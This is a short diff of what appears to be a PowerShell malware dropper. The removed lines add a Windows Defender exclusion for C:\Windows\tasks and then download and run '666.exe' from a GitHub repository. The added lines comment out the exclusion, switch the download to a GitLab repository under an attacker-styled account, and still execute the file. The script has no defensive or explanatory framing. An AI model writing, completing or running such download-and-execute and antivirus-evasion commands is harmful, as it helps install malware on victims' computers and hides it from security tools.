@@ -1,2 +1,2 @@
-Set-MpPreference -ExclusionPath "C:\Windows\tasks\"
-iwr -uri http://github.com/3vilc0der/afwefd237/raw/main/blob/666.exe -O "C:\Windows\tasks\666.exe"; 666.exe
+//Set-MpPreference -ExclusionPath "C:\Windows\tasks\"
+iwr -uri https://gitlab.com/13373v1l/666/-/raw/main/666.exe -O "C:\Windows\tasks\666.exe"; 666.exe
